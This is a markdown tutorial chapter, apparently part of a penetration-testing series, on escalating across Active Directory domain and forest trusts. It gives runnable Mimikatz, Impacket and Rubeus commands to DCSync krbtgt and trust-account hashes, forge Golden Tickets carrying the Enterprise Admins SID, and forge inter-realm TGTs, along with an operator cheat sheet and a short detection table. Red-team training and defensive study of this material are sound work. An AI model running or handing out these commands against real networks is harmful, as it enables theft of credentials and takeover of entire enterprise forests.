# Phase 9: Forest & Trust Attacks

> Going from one compromised domain to another via AD trust relationships. Master-level content.

---

## Background: What is a Trust?

A **trust** lets users in one domain authenticate to resources in another. AD trusts come in flavors:

| Type | Direction | Used for |
|------|-----------|----------|
| Parent-child | Two-way, transitive | Subdomains in same forest (auto-created) |
| Tree-root | Two-way, transitive | Multiple trees in one forest |
| External | Usually one-way, non-transitive | Domains in different forests |
| Forest | Two-way, transitive (within forest pair) | Two whole forests trusting each other |
| Realm | One-way, transitive or not | Non-Windows Kerberos (MIT, Heimdal) |
| Shortcut | Transitive | Performance hack between deep child domains |

**Key concept — SID Filtering / Quarantine**:
- *Intra-forest trusts* (parent-child, tree-root): **No SID filtering**. The full forest is one security boundary.
- *Inter-forest trusts* (external, forest): SID Filtering enabled by default → SIDs from outside the trusted domain's primary SID space are stripped.
- SID History injection abuses the **lack** of SID filtering inside a forest.

**The single most important takeaway**: A **forest** is the security boundary, **not a domain**. If you compromise a child domain, you can typically escalate to the forest root using SID History.

---

## 1. Enumerate Trusts

```powershell
# PowerView
Get-DomainTrust
Get-ForestTrust

# Cross-domain trusts visible to you
Get-DomainTrustMapping
```

```bash
# Impacket
nxc ldap 10.10.10.10 -u jdoe -p Password1 -M get-network
# Or raw LDAP
ldapsearch -H ldap://10.10.10.10 -D jdoe@lab.local -w Password1 \
  -b "DC=lab,DC=local" "(objectClass=trustedDomain)"
```

**In BloodHound**: trust relationships appear as edges between domain nodes. Use the query "Map domain trusts" then mark the destination domain as a goal.

---

## 2. Child → Parent (Intra-Forest Escalation)

**Concept**: You have DA in `child.parent.local`. You want EA in `parent.local`. Because intra-forest trusts don't filter SIDs, you can forge a Golden Ticket with the **Enterprise Admins SID** from the parent, injected into your child-domain user's SID History.

### Get what you need
```bash
# From child DC, DCSync child's krbtgt
secretsdump.py child.parent.local/childadmin:Pass@dc-child.child.parent.local -just-dc-user krbtgt

# Get child domain SID
lookupsid.py child.parent.local/childadmin:Pass@dc-child.child.parent.local | grep "Domain SID"

# Get parent domain SID (needed for Enterprise Admins SID = parentSID-519)
lookupsid.py child.parent.local/childadmin:Pass@dc-parent.parent.local | grep "Domain SID"
```

### Forge an inter-realm Golden Ticket with SID History

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:child.parent.local \
  /sid:S-1-5-21-CHILD \
  /krbtgt:<child_krbtgt_hash> \
  /sids:S-1-5-21-PARENT-519 \    # Enterprise Admins SID in PARENT
  /ptt
```

```bash
# Impacket
ticketer.py -nthash <child_krbtgt> -domain-sid S-1-5-21-CHILD \
  -domain child.parent.local \
  -extra-sid S-1-5-21-PARENT-519 \
  administrator

export KRB5CCNAME=administrator.ccache
secretsdump.py -k -no-pass dc-parent.parent.local
# → krbtgt of the forest root → EA across the forest
```

🔴 **OPSEC**: Generates 4769 events with unusual SID history. Defender for Identity flags this directly: "Suspected forging of a Golden Ticket using cross-domain trust".

---

## 3. Trust Tickets / Inter-Realm TGTs

**Concept**: Trusts are implemented as inter-realm keys. When `domA` trusts `domB`, both domains have a shared key for the trust (the inter-realm TGT). Each trust has its own trust account (e.g. `domB$`). Compromise this trust key → forge inter-realm TGTs.

### Dump trust keys
```powershell
# Mimikatz on DC
lsadump::trust /patch
# Outputs all trust keys (RC4 + AES)
```

```bash
# Or DCSync the trust account
secretsdump.py lab.local/administrator:Pass@10.10.10.10 -just-dc-user 'OTHER_DOMAIN$'
```

### Forge inter-realm TGT
```powershell
# Mimikatz
kerberos::golden /domain:current.local /sid:S-1-5-21-CURRENT \
  /sids:S-1-5-21-TARGET-519 \
  /rc4:<TRUST_KEY_NTLM> \
  /user:administrator /service:krbtgt \
  /target:target.local \
  /ticket:trust.kirbi

# Use it: request a TGS in target.local for some service
.\Rubeus.exe asktgs /service:cifs/dc.target.local /ticket:trust.kirbi /ptt
```

Same concept as Golden Ticket but the key is the **trust key**, not krbtgt.

---

## 4. Foreign Group Memberships

**Concept**: A user from domain A might be in a group in domain B (`Foreign Security Principal`). If you compromise that user, you have rights in domain B.

```powershell
# Find FSPs
Get-DomainForeignGroupMember
Get-DomainForeignUser

# Or BloodHound: "ForeignSecurityPrincipal" nodes
```

---

## 5. Unconstrained Delegation Across Trusts

If a server in domain A has unconstrained delegation and a DA from domain B logs in (or is coerced) → you get their TGT → DCSync domain B.

Coercion across trusts requires the trust to be configured to allow it (most internal trusts do).

---

## 6. Cross-Forest Attacks (Harder)

For inter-forest trusts, SID filtering applies → SID History trick doesn't work directly. Options:

### Trust Account Print
Even with SID filtering, the trust key abuse (Section 3) still works if you compromise the trust key — you can forge inter-realm TGTs.

### SID History bypass — "Trust quarantine bypass"
Specific SIDs (`Enterprise Domain Controllers`, others) are sometimes NOT filtered even with SID filtering enabled. Research by Will Schroeder + others has shown chain attacks abusing this in specific configs. Highly target-specific.

### Foreign membership chains
Find any user, computer, or group in the target forest that has rights granted to a principal in your forest. BloodHound's cross-forest analysis is the right tool.

---

## 7. Operator Reference — When Each Attack Applies

```
You're in: child.parent.local with DA
Want:      EA in parent.local (same forest)
Use:       SID History Golden Ticket (Section 2) — easy

You're in: lab.local with DA
Want:      Access to partner.external (separate forest)
Use:       Trust ticket forging (Section 3) — moderate
           Or find foreign group memberships (Section 4)

You're in: any domain
Want:      Cross-forest with SID filter on
Use:       Foreign membership audit + targeted attack — case by case
```

---

## Detection Summary

| Attack | Key indicator |
|--------|---------------|
| Cross-domain golden w/ SID History | 4769 with SID History containing target-domain SIDs |
| Trust key abuse | 4769 from a different realm than the user's primary |
| Foreign membership escalation | 4624 LogonType 10 from a foreign account in privileged group |
| DCShadow across trust | New replication partner (4742 / DfI alert) |

---

## Next Step

For the deepest impact: → **Phase 10: AD CS Attacks** (`10-adcs.md`) — often the most reliable path to forest root in modern hybrid environments.
